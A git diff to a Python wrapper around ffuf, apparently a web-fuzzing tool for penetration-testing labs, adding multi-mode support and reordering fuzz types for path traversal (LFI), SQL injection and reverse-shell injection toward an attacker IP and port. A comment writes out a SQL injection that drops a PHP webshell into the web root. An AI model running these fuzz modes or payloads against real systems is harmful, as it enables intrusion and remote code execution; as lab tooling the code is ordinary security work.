@@ -15,15 +15,14 @@ from .encoders import *
 from .revshells import get_revshells
 from .wordlists import wordlist_strip_prefix
 
-# TODO: Allow for multiple modes simultaneously
-# TODO: Known path should not start with slash and should end with one (if it is a dir)
-# TODO: Figure out how to recommend PHP Inclusion (LFI), SSTI or XSS based on reflection analysis
-
-# TODO: SQL webshell mode - e.g. ' UNION SELECT "PHP SHELL", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
-#           - Test on e.g. SQL Injections Attacks - Module Exercise - VM #2 
 # TODO: SQL error-based and blind-based modes?
+# TODO: SQL webshell mode - e.g. ' UNION SELECT "PHP SHELL", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+#           - Test on e.g. SQL Injections Attacks - Module Exercise - VM #2
+#           - Build list from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-command-execution, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-command-execution, https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution, 
+
 # TODO: PHP filters (php://filter/... and data://...)
 # TODO: Remote file inclusion? Test if we can establish a connection to a file hosted on a local webserver (run a simple web server). Or does this go in the PHP Inclusion, SSTI, and XSS category?
+# TODO: Revshell, download tools beforehand?
 
 def relpath_linux(args):
     return [b"", b"../", b"../../", b"../../../", b"../../../../../../../../../../../../", b"/", b"~/"]
@@ -91,20 +90,32 @@ FUZZ_TYPES = {
         ]),
     ], encoders=[url_encoder], required_args=[]),
 
-    "lfi-known-path": FuzzType(params = [
+    "lfi-known-part": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
             relpath,
-            lambda args: [args.known_path.encode()]
+            lambda args: [args.known_part.encode()]
         ]),
-    ], encoders=[url_encoder], required_args=["known_path"]),
+    ], encoders=[url_encoder], required_args=["known_part"]),
     
     "lfi-known-part-linux": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
             relpath_linux,
-            lambda args: [args.known_path.encode()],
+            lambda args: [args.known_part.encode()],
             "/usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt"
         ]),
-    ], encoders=[url_encoder], required_args=["known_path"]),
+    ], encoders=[url_encoder], required_args=["known_part"]),
+
+    "revshell-linux": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
+        ]),
+    ], encoders=[revshell_encoder_linux], required_args=["attackbox_ip", "attackbox_port"]),
+
+    "revshell-windows": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
+        ]),
+    ], encoders=[revshell_encoder_windows], required_args=["attackbox_ip", "attackbox_port"]),
 
     "sqli-identify": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
@@ -119,20 +130,6 @@ FUZZ_TYPES = {
             sqli_suffix,
         ]),
     ], encoders=[url_encoder], required_args=[]),
-
-    "revshell-linux": FuzzType(params = [
-        FuzzParameter(name="FUZZ", wordlists=[
-            # TODO: Try downloading the sufficient tools beforehand?
-            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
-        ]),
-    ], encoders=[revshell_encoder_linux], required_args=["attackbox_ip", "attackbox_port"]),
-
-    "revshell-windows": FuzzType(params = [
-        FuzzParameter(name="FUZZ", wordlists=[
-            # TODO: Try downloading the sufficient tools beforehand?
-            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
-        ]),
-    ], encoders=[revshell_encoder_windows], required_args=["attackbox_ip", "attackbox_port"]),
 }
 
 MAX_DISPLAY_RESULTS = 10
@@ -290,27 +287,34 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('-p', '--proto', required=True, help="http or https")
     parser.add_argument('-r', '--request', required=True, help="Request template file")
-    parser.add_argument('-t', '--type', required=True, choices=list(FUZZ_TYPES.keys()), help="Type of fuzz")
+    parser.add_argument('-t', '--types', required=True, choices=list(FUZZ_TYPES.keys()), nargs="+", help="Type of fuzz")
     parser.add_argument('-th', '--threads', type=int, default=4, help="Number of threads to run FFUF with")
 
     parser.add_argument('--attackbox-ip')
     parser.add_argument('--attackbox-port', type=int)
-    parser.add_argument('--known-path')
+    parser.add_argument('--known-part')
 
     args = parser.parse_args()
+    
+    fuzz_types = [FUZZ_TYPES[t] for t in args.types]
 
-    fuzz_type = FUZZ_TYPES[args.type]
-    for req_arg in fuzz_type.required_args:
-        if not getattr(args, req_arg):
-            print(f"Error: Argument `{req_arg.replace("_", "-")}` is required to perform `{args.type}` fuzzing")
-            return
+    for fuzz_type in fuzz_types:
+        for req_arg in fuzz_type.required_args:
+            if not getattr(args, req_arg):
+                print(f"Error: Argument `{req_arg.replace("_", "-")}` is required to perform `{type}` fuzzing")
+                return
+            
+    if args.known_part and (args.known_part[0] == "/" or args.known_part[-1] != "/"):
+        print("--known-part should not start with a slash, and it should end with one")
+        return
 
     response_search_targets = set()
     with open(args.request, "rb") as f: # Check that params are given in the request file and determine substring search targets
         request_raw = f.read()
 
-        for param in fuzz_type.params:
-            assert param.name.encode() in request_raw
+        for fuzz_type in fuzz_types:
+            for param in fuzz_type.params:
+                assert param.name.encode() in request_raw
 
         requestline_headers, request_body = request_raw, b""
         if b"\r\n\r\n" in request_raw or b"\n\n" in request_raw:
@@ -334,12 +338,16 @@ def main():
     
     print(f"Will search for reflection of {response_search_targets} in response bodies. Make sure these inputs are as unique as possible!")
     
-    config_hash = hashlib.md5(f"{args.proto}|{args.request}|{args.type}|{args.attackbox_ip}|{args.attackbox_port}|{args.known_path}".encode("utf-8")).hexdigest()
+    config_hash = hashlib.md5(f"{args.proto}|{args.request}|{args.types}|{args.attackbox_ip}|{args.attackbox_port}|{args.known_part}".encode("utf-8")).hexdigest()
     data_dir = os.path.join(os.path.expanduser("~"), ".local", "share", "web-fuzzer", config_hash)
     shutil.rmtree(data_dir, ignore_errors=True)
     os.makedirs(data_dir)
 
-    for i, fuzz_args in enumerate(fuzz_type.command_args(data_dir, args)):
+    command_args = []
+    for fuzz_type in fuzz_types:
+        command_args.extend(fuzz_type.command_args(data_dir, args))
+
+    for i, fuzz_args in enumerate(command_args):
         data_file = os.path.join(data_dir, f"ffuf-{i}.json")
         log_file = os.path.join(data_dir, f"ffuf-log-{i}.txt")
         os.system(f"ffuf -noninteractive -t {args.threads} -mc all -request-proto {args.proto} -request {args.request} -timeout 30{fuzz_args} -debug-log {log_file} -o {data_file} -of json -od {data_dir}/ > /dev/null")
@@ -382,7 +390,6 @@ def main():
                     if value in missing_payloads[data_file][param]:
                         del missing_payloads[data_file][param][value]
     
-   
     display_analysis(scan_results, "status", "Status code")
     display_analysis(scan_results, "length", "Content length", outlier_based=True)
     display_analysis(scan_results, "words", "Content words", outlier_based=True)
